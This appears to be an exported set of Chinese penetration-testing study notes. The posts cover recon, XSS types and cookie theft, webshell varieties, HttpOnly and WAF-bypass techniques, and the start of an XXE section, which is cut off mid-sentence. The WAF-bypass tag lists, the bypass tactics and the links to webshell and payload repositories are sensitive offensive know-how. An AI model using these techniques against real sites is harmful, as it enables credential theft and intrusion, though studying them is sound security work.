    <content><![CDATA[<h2 id="信息收集（三）——APP以及其他资产的收集"><a href="#信息收集（三）——APP以及其他资产的收集" class="headerlink" title="信息收集（三）——APP以及其他资产的收集"></a>信息收集（三）——APP以及其他资产的收集</h2><h2 id="APP信息收集"><a href="#APP信息收集" class="headerlink" title="APP信息收集"></a>APP信息收集</h2><h3 id="获取apk数据包隐藏的数据信息"><a href="#获取apk数据包隐藏的数据信息" class="headerlink" title="获取apk数据包隐藏的数据信息"></a>获取apk数据包隐藏的数据信息</h3><figure class="highlight gcode"><table><tr><td class="code"><pre><code class="hljs gcode">burpsuite设置代理抓包配合其他反编译工具<span class="hljs-comment">(个人用的是：漏了个大洞)</span>，综合进行分析。<br>！！！若分析出来涉及到web的，即解析出来web网站，可以直接按照web的思路走。若不<br>涉及到web，可以尝试提取，反编译，等操作。<br></code></pre></td></tr></table></figure>
<h3 id="某ip无WEB框架下的第三方测试"><a href="#某ip无WEB框架下的第三方测试" class="headerlink" title="某ip无WEB框架下的第三方测试"></a>某ip无WEB框架下的第三方测试</h3><figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim"><span class="hljs-number">1</span>、各种端口一顿乱扫 --<span class="hljs-keyword">nmap</span>(等待结果的同时用三款黑暗引擎扫ip等，若扫域名，把www去掉)<br>   各种接口一顿乱扫<br>   接口部分一顿测试<br>   ---来自迪总<br><span class="hljs-number">2</span>、site:<span class="hljs-keyword">abc</span>.<span class="hljs-keyword">com</span>（查找子域名）<br>   inurl(它的作用是限定在url中搜索，就是地址栏里的内容。使用格式是：“inur<span class="hljs-variable">l:xxx</span>”、<br>   “inur<span class="hljs-variable">l:xxx</span> 关键词”、“关键词 inur<span class="hljs-variable">l:xxx</span>”)<br></code></pre></td></tr></table></figure>
<h3 id="新知识点–robots-txt"><a href="#新知识点–robots-txt" class="headerlink" title="新知识点–robots.txt"></a>新知识点–robots.txt</h3><h4 id="这是什么东西？"><a href="#这是什么东西？" class="headerlink" title="这是什么东西？"></a>这是什么东西？</h4><figure class="highlight 1c"><table><tr><td class="code"><pre><code class="hljs 1c">robots.txt是一个协议,我们可以把它理解为一个网站的<span class="hljs-string">&quot;管家&quot;</span>,它会告诉搜索引擎哪些页面<br>可以访问,哪些页面不能访问。也可以规定哪些搜索引擎可以访问我们的网站而哪些搜索引擎<br>不能爬取我们网站的信息等等,是网站管理者指定的<span class="hljs-string">&quot;君子协议&quot;</span>。<br></code></pre></td></tr></table></figure>
<h4 id="我该怎么进入这个文件？"><a href="#我该怎么进入这个文件？" class="headerlink" title="我该怎么进入这个文件？"></a>我该怎么进入这个文件？</h4><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">在浏览器的网址搜索栏中，输入网站的根域名，然后再输入/robot.txt即可查看。比如，百度<br>的robots.txt网址为 “https:<span class="hljs-regexp">//</span>www.baidu.com/robots.txt”。<br></code></pre></td></tr></table></figure>
<h2 id="其他资产-收集"><a href="#其他资产-收集" class="headerlink" title="其他资产 收集"></a>其他资产 收集</h2><h3 id="Github监控"><a href="#Github监控" class="headerlink" title="Github监控"></a>Github监控</h3><figure class="highlight 1c"><table><tr><td class="code"><pre><code class="hljs 1c">便于收集整理最新<span class="hljs-built_in">exp</span>或poc <br>便于发现相关测试目标的资产<br></code></pre></td></tr></table></figure>
<p><a href="https://blog.csdn.net/penriver/article/details/127826473">exp、poc等相关术语</a><br><a href="https://www.yuque.com/weiker/xiaodi/qdao80">监听小工具&#x2F;脚本</a></p>
<h3 id="各种子域名查询"><a href="#各种子域名查询" class="headerlink" title="各种子域名查询"></a>各种子域名查询</h3><h3 id="DNS-备案-证书"><a href="#DNS-备案-证书" class="headerlink" title="DNS,备案,证书"></a>DNS,备案,证书</h3><h3 id="全球节点请求cdn"><a href="#全球节点请求cdn" class="headerlink" title="全球节点请求cdn"></a>全球节点请求cdn</h3><figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">枚举爆破或解析子域名对应<br>便于发现管理员相关的注册信息<br></code></pre></td></tr></table></figure>
<h3 id="黑暗引擎相关搜索"><a href="#黑暗引擎相关搜索" class="headerlink" title="黑暗引擎相关搜索"></a>黑暗引擎相关搜索</h3><figure class="highlight autohotkey"><table><tr><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-built_in">fofa,</span> shodan, zoomeye<br></code></pre></td></tr></table></figure>
<h3 id="微信公众号接口获取"><a href="#微信公众号接口获取" class="headerlink" title="微信公众号接口获取"></a>微信公众号接口获取</h3><h3 id="内部群内部资源"><a href="#内部群内部资源" class="headerlink" title="内部群内部资源"></a>内部群内部资源</h3><h3 id="参考资源"><a href="#参考资源" class="headerlink" title="参考资源"></a>参考资源</h3><p><a href="https://blog.csdn.net/m0_51683653/article/details/127252676">robits.txt</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=8&vd_source=d32bce54780cf3d9710df43274886fde">信息收集演示！！！较完整（可二刷）</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=9&vd_source=d32bce54780cf3d9710df43274886fde">src目标中的信息收集全覆盖，伪实战，值得一看</a></p>
]]></content>
      <categories>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>xss跨站基本知识</title>
    <url>/2023/10/09/xss1/</url>
    <content><![CDATA[<h2 id="XSS跨站"><a href="#XSS跨站" class="headerlink" title="XSS跨站"></a>XSS跨站</h2><h3 id="XSS跨站定义"><a href="#XSS跨站定义" class="headerlink" title="XSS跨站定义"></a>XSS跨站定义</h3><p>跨站点脚本攻击，简称XSS，是指攻击者利用网站存在的漏洞，通过在网站中注入恶意脚本代码，从而使得用户在访问该网站时受到攻击。这些恶意脚本代码通常是JavaScript 代码，它们可以窃取用户的敏感信息，如用户名、密码等，并将这些信息发送到攻击者的服务器。和用户交互的地方均有可能产生跨站漏洞。</p>
<h3 id="XSS跨站原理"><a href="#XSS跨站原理" class="headerlink" title="XSS跨站原理"></a>XSS跨站原理</h3><p><img src="https://pic.imgdb.cn/item/65241563c458853aef6a1949.png" alt="图一" title="XSS跨站学习大纲(侵权联删)"><br>XSS攻击的本质是利用Web应用程序中的漏洞，向网页注入恶意脚本代码，然后将这些代码嵌入到网页中，当其他用户访问这个网页时，恶意脚本将会被执行。<br>攻击者通常会在Web应用程序的输入框、评论框、搜索框等可输入内容的地方输入特定的脚本代码，这些代码可以被Web应用程序直接插入到网页中，导致网页上的所有用户都会受到攻击。</p>
<figure class="highlight x86asm"><table><tr><td class="code"><pre><code class="hljs x86asm">是前端漏洞,感觉和SQL注入差不多,只不过注入的是<span class="hljs-keyword">js</span>语句。<span class="hljs-keyword">js</span>脚本能实现什么,XSS就能实现什么。<br></code></pre></td></tr></table></figure>
<h3 id="XSS跨站前提条件"><a href="#XSS跨站前提条件" class="headerlink" title="XSS跨站前提条件"></a>XSS跨站前提条件</h3><p>1、浏览器内核版本(IE、或其他高版本浏览器禁用js脚本)。<br>2、js代码的编写。<br><a href="https://baijiahao.baidu.com/s?id=1770456094078258302&wfr=spider&for=pc">XSS详解</a></p>
<h3 id="XSS跨站分类"><a href="#XSS跨站分类" class="headerlink" title="XSS跨站分类"></a>XSS跨站分类</h3><p>1、反射型(危害较小,后端语言进行数据处理)<br>(1)、需要用户(被攻击者)去触发,相当于一次交互的过程。<br>(2)、！！ 发包 x&#x3D;xiaodi&#x3D;&gt;x.php(根据代码类型返回相应的处理结果,返回的不一定是php脚本执行结果)&#x3D;&gt;回包<br>(3)、只能自己排除其他漏洞后猜测。<br>2、存储型(危害大)–也是后端语言数据处理<br>(1)、如留言板、评论区等,攻击者填入数据(js脚本)后,会存储到数据库,那么我下一次访问也会显示(查询数据库)。攻击会一直持续到数据被删除为止。<br>(2)、！！ 发包 x&#x3D;xiaodi&#x3D;&gt;x.php(根据代码类型返回相应的处理结果,返回的不一定是php脚本执行结果)&#x3D;&gt;写到数据库的某个表&#x3D;&gt;x.php&#x3D;&gt;回显。<br>(3)、只能自己排除其他漏洞后猜测。<br>3、DOM型(是反射型的一种,大部分可以看作直接给前端处理,没有给后端)–js前端语言数据处理<br>(1)、DOM就是在操作网站的标签或者属性，是提前预写好的，DOM可以结合前面两个。<br>(2)、！！ 发包 x&#x3D;xiaodi&#x3D;&gt;x.php(根据代码类型返回相应的处理结果,返回的不一定是php脚本执行结果)&#x3D;&gt;本地浏览器的静态前端代码&#x3D;&gt;x.php(注意:若还有其他数据给x.php才继续后续操作,否则传给前端后直接回显)&#x3D;&gt;回包。<br>(3)、可以通过代码自己发现。<br><img src="https://pic.imgdb.cn/item/652541f0c458853aefb3db7a.png" alt="图一" title="DOM树"><br><img src="https://pic.imgdb.cn/item/6525422dc458853aefb3e3d5.jpg" alt="图二" title="放射&amp;存储型"><br><img src="https://pic.imgdb.cn/item/6525422dc458853aefb3e3d5.jpg" alt="图三" title="DOM型"><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=24&vd_source=d32bce54780cf3d9710df43274886fde">DOM型介绍以及重温前后端的区别:27:00</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=24&vd_source=d32bce54780cf3d9710df43274886fde">三种XSS的区别(建议多刷):35:00</a></p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><code class="hljs mipsasm">以下形象的解释搬运自小迪安全<br><span class="hljs-number">1</span>.DOM型(不经过服务器，前端<span class="hljs-keyword">js代码的利用)：</span><br><span class="hljs-keyword"></span>本地利用漏洞，这种漏洞存在于页面中客户端脚本自身。其攻击过程如下所示：<br>Alice给<span class="hljs-keyword">Bob发送一个恶意构造了Web的URL。</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">Bob点击并查看了这个URL。</span><br><span class="hljs-keyword"></span>恶意页面中的<span class="hljs-keyword">JavaScript打开一个具有漏洞的HTML页面并将其安装在Bob电脑上。</span><br><span class="hljs-keyword"></span>具有漏洞的HTML页面包含了在<span class="hljs-keyword">Bob电脑本地域执行的JavaScript。</span><br><span class="hljs-keyword"></span>Alice的恶意脚本可以在<span class="hljs-keyword">Bob的电脑上执行Bob所持有的权限下的命令。</span><br><span class="hljs-keyword"></span><span class="hljs-number">2</span>.反射型：<br>这种漏洞和类型A有些类似，不同的是Web客户端使用Server端脚本生成页面为用户提供数据时，如果未经验证的用户数据被包含在页面中而未经HTML实体编码，客户端代码便能够注入到动态页面中。<br>其攻击过程如下：<br>Alice经常浏览某个网站，此网站为<span class="hljs-keyword">Bob所拥有。Bob的站点运行Alice使用用户名/密码进行登录，并存储敏感信息(比如银行帐户信息)。</span><br><span class="hljs-keyword"></span>Charly发现<span class="hljs-keyword">Bob的站点包含反射性的XSS漏洞。</span><br><span class="hljs-keyword"></span>Charly编写一个利用漏洞的URL，并将其冒充为来自<span class="hljs-keyword">Bob的邮件发送给Alice。</span><br><span class="hljs-keyword"></span>Alice在登录到<span class="hljs-keyword">Bob的站点后，浏览Charly提供的URL。</span><br><span class="hljs-keyword"></span>嵌入到URL中的恶意脚本在Alice的浏览器中执行，就像它直接来自<span class="hljs-keyword">Bob的服务器一样。此脚本盗窃敏感信息(授权、信用卡、帐号信息等)然后在Alice完全不知情的情况下将这些信息发送到Charly的Web站点。</span><br><span class="hljs-keyword"></span><span class="hljs-number">3</span>.存储型（长久型，危害最大）：<br>该类型是应用最为广泛而且有可能影响到Web服务器自身安全的漏洞，骇客将攻击脚本上传到Web服务器上，使得所有访问该页面的用户都面临信息泄漏的可能，其中也包括了Web服务器的管理员。其攻击过程如下：<br><span class="hljs-keyword">Bob拥有一个Web站点，该站点允许用户发布信息/浏览已发布的信息。</span><br><span class="hljs-keyword"></span>Charly注意到<span class="hljs-keyword">Bob的站点具有类型C的XSS漏洞。</span><br><span class="hljs-keyword"></span>Charly发布一个热点信息，吸引其它用户纷纷阅读。<br><span class="hljs-keyword">Bob或者是任何的其他人如Alice浏览该信息，其会话cookies或者其它信息将被Charly盗走。</span><br><span class="hljs-keyword"></span>类型<span class="hljs-number">1</span>直接威胁用户个体，而类型<span class="hljs-number">2</span>和类型<span class="hljs-number">3</span>所威胁的对象都是企业级Web应用。<br></code></pre></td></tr></table></figure>
<h3 id="XSS跨站危害"><a href="#XSS跨站危害" class="headerlink" title="XSS跨站危害"></a>XSS跨站危害</h3><p>● 1、盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号<br>● 2、控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力<br>● 3、盗窃企业重要的具有商业价值的资料<br>● 4、非法转账<br>● 5、强制发送电子邮件<br>● 6、网站挂马<br>● 7、控制受害者机器向其它网站发起攻击（重定向语句）<br>● 8、窃取cookie的sessionid，冒充登录。<br>XSS攻击利用到最大就需要自己有台服务器用于窃取信息，还要利用一点社工，骗取别人点击恶意的链接。</p>
<h2 id="XSS跨站攻击方式"><a href="#XSS跨站攻击方式" class="headerlink" title="XSS跨站攻击方式"></a>XSS跨站攻击方式</h2><h3 id="XSS与cookie"><a href="#XSS与cookie" class="headerlink" title="XSS与cookie"></a>XSS与cookie</h3><p>就是诱使目标点击&#x2F;登录某个页面,在他进入页面的一瞬间取得其cookie。这样我们便可以进入到对方的后台。<br>cookie:类似于身份信息,用于验证身份。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=24&vd_source=d32bce54780cf3d9710df43274886fde">XSS与cookie(听讲知识点):54:00</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=24&vd_source=d32bce54780cf3d9710df43274886fde">XSS平台的使用:1:03:00</a><br><a href="https://blog.csdn.net/weixin_44657888/article/details/124692782">kali搭建BeEF联系XSS跨站</a></p>
<h3 id="如何发现XSS跨站"><a href="#如何发现XSS跨站" class="headerlink" title="如何发现XSS跨站"></a>如何发现XSS跨站</h3><p>1、工具扫<br>2、<a href="https://www.bilibili.com/video/BV1JZ4y1c7ro?p=24&vd_source=d32bce54780cf3d9710df43274886fde">自己搭建平台XSS跨站攻击演示(略微提了一嘴如何发现):1:25:00</a></p>
<h2 id="cookie与session"><a href="#cookie与session" class="headerlink" title="cookie与session"></a>cookie与session</h2><p>1、cookie存在浏览器 session 存在服务器<br>2、要管理员登录到后台的时候盗取的cookie才是真正的管理员cookie,否则只是普通用户的cookie。<br>3、cookie储存到本地,存活时间较长,小中型网站使用;session(占用服务器资源) 也称为会话,存储到服务器,存活时间较短,大型网站使用。<br>4、cookie是用户的身份证，session是服务器的用户身份核查表<br>5、它们都是用户凭据。<br>6、盗取cookie、会话(session)劫持。</p>
<h2 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h2><p>1、XSS实现的条件较为苛刻,既要浏览器版本满足,要有漏洞,对方的浏览器不会拦截,对方有登陆过且留下痕迹,而且要对方触发。<br>2、需要配合一定社工。<br>3、发现存在这个漏洞可以尝试去用一下。<br>4、主要是对方管理员要经常登录。</p>
]]></content>
      <categories>
        <category>XSS跨站</category>
      </categories>
      <tags>
        <tag>XSS跨站</tag>
      </tags>
  </entry>
  <entry>
    <title>跨站订单盗取与webshell箱子反杀</title>
    <url>/2023/10/10/xss2/</url>
    <content><![CDATA[<h2 id="演示简单的XSS"><a href="#演示简单的XSS" class="headerlink" title="演示简单的XSS"></a>演示简单的XSS</h2><h3 id="订单系统XSS盲打-平台"><a href="#订单系统XSS盲打-平台" class="headerlink" title="订单系统XSS盲打_平台"></a>订单系统XSS盲打_平台</h3><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=25&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">跨站演示:3:00</a><br>postman下载地址:<a href="https://www.postman.com/downloads/">https://www.postman.com/downloads/</a></p>
<h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=25&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">拓展–可二刷(没怎么看懂,好像是通过XSS跨站脚本远程盗取cookie到自己的主机上并保存):15:00-34：30</a></p>
<h2 id="webshell箱子系统XSS盲打-工具"><a href="#webshell箱子系统XSS盲打-工具" class="headerlink" title="webshell箱子系统XSS盲打_工具"></a>webshell箱子系统XSS盲打_工具</h2><h3 id="基础名词认识"><a href="#基础名词认识" class="headerlink" title="基础名词认识"></a>基础名词认识</h3><p>1、后门(backdoor):后门一般是指绕过安全性控制而获取对程序或系统访问的程序，后门原本是开发者预留的用来后期修改程序或系统中存在的威胁，但是由于黑客对后门的恶意使用，使得后门成为了计算机安全得一大威胁，一旦计算机系统或程序中的后们被黑客发现，那么黑客就能轻易地通过后门达到入侵目标计算机 的目的。常见的后门包括：（网页后门）（线程插入后门）（扩展后门）（C&#x2F;S后门）。后门包括网页后门。<br>2、网站后门(webshell):Webshell就是以asp、php、jsp或cgi等网页文件形式存在的一种代码执行环境，也可以将其称做为一种网页后门。Webshell根据脚本可以分为PHP脚本木马，ASP脚本木马，JSP脚本木马，也有基于.NET的脚本木马。根据时代和技术的变迁，也有用python和lua编写的脚本木马，常用有如下几种(常用的还是一句话木马)：<br>大马:体积大，功能全；会调用系统关键函数；以代码加密进行隐藏<br>小马:体积小，功能少；一般只有一个上传功能，用于上传大马<br>一句话木马:代码短；使用场景大，可单独生成文件，可插入文件；安全性高，隐藏性强，可变形免杀；框架不变，数据执行，数据传递；使用客户端管理webshell，省去使用命令行以及各种参数配置，可以使用中国蚁剑图形化操作webshell。一句话木马,通过菜刀、冰蝎、蚁剑去控制网站。<br>打包马:主要用于打包网站源码<br>拖库马:主要用于导出网站数据库<br>内存马:无文件落地；极难检测和发现；难以清除<br>3、实例1：WebShell攻击事件<br>某公司的财务系统在使用过程中突然出现了异常状况，经过检查发现是黑客利用一处上传文件漏洞，植入了一个PHP WebShell程序。由于黑客使用了加密技术，因此该WebShell长时间未被检测到。后来负责人调取了完整数据日志后才追查到了这个问题。<br>4、实例2：后门攻击事件<br>某商业银行网络系统出现严重安全问题，运营商辗转发现了一个可疑的进程。进一步调查发现，黑客在6个高频交易服务器上分别植入了后门程序，并同时控制了一个小型内网计算机群。通过对该群的掌控，黑客获得了银行存款、投资等多项信息，损失达数百万元。<br>参考资料:<br><a href="https://www.shangyouw.cn/shezhi/arc293044.html">https://www.shangyouw.cn/shezhi/arc293044.html</a><br><a href="https://blog.csdn.net/Spontaneous_0/article/details/129462860">https://blog.csdn.net/Spontaneous_0/article/details/129462860</a><br><a href="https://zhuanlan.zhihu.com/p/549851099">https://zhuanlan.zhihu.com/p/549851099</a><br>5、webshell箱子:被称为后门中的后门,即后门代码中再插入后门语句。将盗取的网站权限收集起来。它可以让你在webshell中植入后门，当别人用你植入过后门的webshell去获取渗透别的网站时，你的webshellbox信封将会收到他留下的后门地址以及密码。也就是说免费帮别人挖洞。<br>网站后门下载地址:<a href="https://github.com/tennc/webshell(%E5%BB%BA%E8%AE%AE%E6%95%B4%E5%88%B0%E8%99%9A%E6%8B%9F%E6%9C%BA)">https://github.com/tennc/webshell(建议整到虚拟机)</a><br>webshell箱子搭建教程:<a href="https://blog.csdn.net/weixin_45951067/article/details/121308040">https://blog.csdn.net/weixin_45951067/article/details/121308040</a></p>
<h3 id="webshell箱子系统XSS盲打"><a href="#webshell箱子系统XSS盲打" class="headerlink" title="webshell箱子系统XSS盲打"></a>webshell箱子系统XSS盲打</h3><p>既然已知webshell箱子是一个后门中的后门,那么也可以设计一个后门中的后门中的后门,反日坐享其成的那个dm。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=25&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">讲解webshell箱子以及反日:35:00</a><br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=25&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">判定一个文件有无后门以及网络真实环境反日:56:20&#x2F;59:45</a><br>判定一个文件有无后门:直接抓包即可,看有没有向莫名其妙的ip地址发送数据包。</p>
<h3 id="结合BeEF实现跨站"><a href="#结合BeEF实现跨站" class="headerlink" title="结合BeEF实现跨站"></a>结合BeEF实现跨站</h3><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=25&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">结合BeEF实现跨站:1:02:33</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1、跨站漏洞常出现在存在留言板、评论区、订单系统、反馈条件等网站。<br>2、有时候成功盗取了cookie,但还是登陆不了对方的后台,这是因为对方开启了session验证。管理员在浏览器复制自己的cookie包含session,但攻击者盗取不了session。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=25&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">大概讲了一下如何获取session(不是很懂):1:30:00</a><br>–好像是通过phpinfo()打印当前访问者的完整cookie,然后访问即可获取到。(可结合文件上传)</p>
]]></content>
      <categories>
        <category>XSS跨站</category>
      </categories>
      <tags>
        <tag>XSS跨站</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS跨站代码以及绕过</title>
    <url>/2023/10/11/xss3/</url>
    <content><![CDATA[<h2 id="XSS跨站绕过过滤的思路与方法"><a href="#XSS跨站绕过过滤的思路与方法" class="headerlink" title="XSS跨站绕过过滤的思路与方法"></a>XSS跨站绕过过滤的思路与方法</h2><h3 id="httponly绕过"><a href="#httponly绕过" class="headerlink" title="httponly绕过"></a>httponly绕过</h3><h3 id="什么是httponly"><a href="#什么是httponly" class="headerlink" title="什么是httponly"></a>什么是httponly</h3><p>在cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止XSS攻击。注意并不能防止xss漏洞，只能是防止cookie被盗取。</p>
<h3 id="绕过httponly"><a href="#绕过httponly" class="headerlink" title="绕过httponly"></a>绕过httponly</h3><p>绕过 httponly：<br>利用账号密码进入<br>1、若浏览器未保存帐号密码：需要 xss 产生登录地址(前提是XSS漏洞需要存在于登录框)，利用表单劫持(相当于发一份给跨站平台,一份发给服务器验证)。<br>2、若浏览器保存帐号密码：浏览器读取帐号密码。<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=26&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">如何绕过httponly:8:00</a></p>
<h3 id="XSS跨站代码绕过-偏教程演示–配合代码审计"><a href="#XSS跨站代码绕过-偏教程演示–配合代码审计" class="headerlink" title="XSS跨站代码绕过(偏教程演示–配合代码审计)"></a>XSS跨站代码绕过(偏教程演示–配合代码审计)</h3><p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=26&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">靶场练习(重点):37:00</a></p>
<h3 id="WAF绕过-以安全狗为例"><a href="#WAF绕过-以安全狗为例" class="headerlink" title="WAF绕过(以安全狗为例)"></a>WAF绕过(以安全狗为例)</h3><h4 id="常见WAF绕过思路"><a href="#常见WAF绕过思路" class="headerlink" title="常见WAF绕过思路"></a>常见WAF绕过思路</h4><p>1、标签语法替换</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">  <span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">img</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">button</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">var</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">iframe</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">object</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">input</span>&gt;</span> </span></span><br><span class="language-xml"><span class="language-handlebars"><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">keygen</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">frameset</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">embed</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">math</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">video</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">audio</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">select</span>&gt;</span></span></span><br></code></pre></td></tr></table></figure>
<p><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=27&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">标签语法替换演示二:12：00</a><br>2、特殊符号干扰(#)–&#x2F;在js内代表一个语句的结束<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=27&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">特殊符号干扰演示一:1：30</a><br>3、提交方式更改–get、post、cookie等提交方式<br>4、垃圾数据溢出<br>5、加密解密算法<br>6、结合其他漏洞绕过–XSStrike自动化实现、burp抓包用字典跑</p>
<h3 id="相关阅读资料"><a href="#相关阅读资料" class="headerlink" title="相关阅读资料"></a>相关阅读资料</h3><p>1、XSS在线fuzz工具:<a href="https://xssfuzzer.com/fuzzer.html">https://xssfuzzer.com/fuzzer.html</a> (自动生成payload)<br>2、WAF攻防笔记:<a href="https://www.yuque.com/office/yuque/0/2023/pdf/34523688/1696908471868-e27eb882-ee6f-46d2-8763-c5a9d9d0047b.pdf?from=https://www.yuque.com/weiker/xiaodi/dmabuqh96629o9yp">https://www.yuque.com/office/yuque/0/2023/pdf/34523688/1696908471868-e27eb882-ee6f-46d2-8763-c5a9d9d0047b.pdf?from=https%3A%2F%2Fwww.yuque.com%2Fweiker%2Fxiaodi%2Fdmabuqh96629o9yp</a><br>3、XSStrike强大的自动化工具：<a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a><br>4、绕过XSS检测详解以及payload参考：<a href="https://bbs.kanxue.com/thread-250852.htm">https://bbs.kanxue.com/thread-250852.htm</a><br>4、fuzz-XSS字典:<a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></p>
<h3 id="相关防御XSS思路"><a href="#相关防御XSS思路" class="headerlink" title="相关防御XSS思路"></a>相关防御XSS思路</h3><p>开启 httponly,输入过滤，输出过滤等<br>PHP:<a href="http://www.zuimoge.com/212.html">http://www.zuimoge.com/212.html</a><br>JAVA:<a href="https://www.cnblogs.com/baixiansheng/p/9001522.html">https://www.cnblogs.com/baixiansheng/p/9001522.html</a></p>
<h3 id="little-总结"><a href="#little-总结" class="headerlink" title="little 总结"></a>little 总结</h3><p>1、一般来说网站存在对于XSS跨站漏洞的代码过滤,我们如何考虑绕过这些代码过滤呢?其实同前面的SQL注入以及文件上传的思路一样,考虑大小写、有没有循环过滤、双写、编码、coookie、post提交方式等的过滤方式,要懂得发散思维。(白盒环境下好测试)<br>2、听课时,提到了来源referer这个过滤验证。在XSS里关联性并不大,但与CRSF、SSRF息息相关。下列是迪总对于这个的一点形象的解释:<br><a href="https://www.bilibili.com/video/BV1JZ4y1c7ro/?p=26&spm_id_from=pageDriver&vd_source=d32bce54780cf3d9710df43274886fde">对于来源检测的解释:1:18:00</a><br><img src="https://pic.imgdb.cn/item/6527cbb1c458853aeff61a0d.png" alt="图一" title="对于来源检测的解释"></p>
]]></content>
      <categories>
        <category>XSS跨站</category>
      </categories>
      <tags>
        <tag>XSS跨站</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE|XML|利用检测绕过</title>
    <url>/2023/10/24/xxexml/</url>
    <content><![CDATA[<h2 id="大纲-总括"><a href="#大纲-总括" class="headerlink" title="大纲|总括"></a>大纲|总括</h2><p><img src="https://pic.imgdb.cn/item/6537dd1bc458853aefa9742c.png" alt="图一" title="xxe|xml"></p>
<h2 id="XML-语言-传输数据的一种类型-XXE-漏洞-基本知识"><a href="#XML-语言-传输数据的一种类型-XXE-漏洞-基本知识" class="headerlink" title="XML(语言|传输数据的一种类型)|XXE(漏洞)|基本知识"></a>XML(语言|传输数据的一种类型)|XXE(漏洞)|基本知识</h2><h3 id="xml-xxe基础概念"><a href="#xml-xxe基础概念" class="headerlink" title="xml|xxe基础概念"></a>xml|xxe基础概念</h3><p>参考：<a href="https://blog.csdn.net/m0_63917373/article/details/127654477">https://blog.csdn.net/m0_63917373/article/details/127654477</a><br>1、XML被设计为传输和存储数据，XML文档结构包括XML声明、DTD文档类型定义(可选)、文档元素，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。<br>2、XXE漏洞全称XMLExternal Entity Injection，即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。<br>3、XXE（XML External Entity）是一种攻击技术，利用了XML解析器的功能来加载外部实体。<br>4、DTD（Document Type Definition）是一种用于定义XML文档结构的规范，其中可以定义实体（Entity）。<br>5、实体是XML中的一种特殊元素，可以用来表示常量值或者引用外部资源。在DTD中，可以使用实体来定义一些常用的字符串，然后在XML文档中使用实体引用来代替这些字符串。例如，可以在DTD中定义一个实体<!ENTITY company "ABC Company">，然后在XML文档中使用&company;来引用这个实体，这样就可以将ABC 